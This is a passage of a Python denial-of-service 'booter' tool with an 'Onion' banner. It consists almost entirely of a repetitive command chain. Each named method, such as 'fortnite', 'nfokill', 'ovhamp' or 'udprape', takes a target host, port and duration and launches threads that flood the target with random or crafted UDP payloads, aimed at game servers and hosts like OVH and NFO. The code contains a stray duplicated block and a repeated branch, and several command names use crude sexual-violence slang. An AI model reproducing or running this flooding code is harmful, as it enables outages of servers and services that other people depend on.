		elif sinput == "fortnite":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev2":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhwdz":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodown":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfokill":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemdown":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hotspot":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemtcp":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fallguys":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "arkilft":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "arkdown":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "r6drop":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "2krape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemkill":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ark225":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "iotv1":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "arknull":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "2kdown":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "iotv2":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "iotv3":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 50000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 30460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 50000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 40000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 22024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 5:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			print ("[\033[31mOnion\033[31m]\033[00m {} Not a command".format(sinput))
			main()

try:
	cls = "clear"
	os.system(cls)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

